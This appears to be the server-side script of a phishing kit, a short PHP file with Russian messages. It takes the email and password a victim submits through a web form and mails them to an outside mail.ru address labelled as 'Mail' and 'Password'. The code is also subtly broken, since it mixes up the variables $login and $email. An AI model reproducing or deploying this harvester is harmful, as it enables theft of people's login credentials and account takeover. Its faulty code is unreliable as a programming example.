<?php
  $login = $_POST['email'];
  $pass = $_POST['pass'];





	$login = htmlspecialchars($email);
	$pass = htmlspecialchars($pass);
 

	$login = urldecode($email);
	$pass = urldecode($pass);

	$login = trim($email);
	$pass = trim($pass);


	if (mail("klacor@mail.ru",
                       "Новое письмо с сайта",
                       "Почта:".$email."\n".
                       "Пароль:".$pass."\n".
                       "From: no-reply@mydomain.ru \r\n")
	) {
                  echo ('Письмо успешно отправлено!');
             }
             else {
                   echo ('Есть ошибка! Проверьте данные...');
             }
?>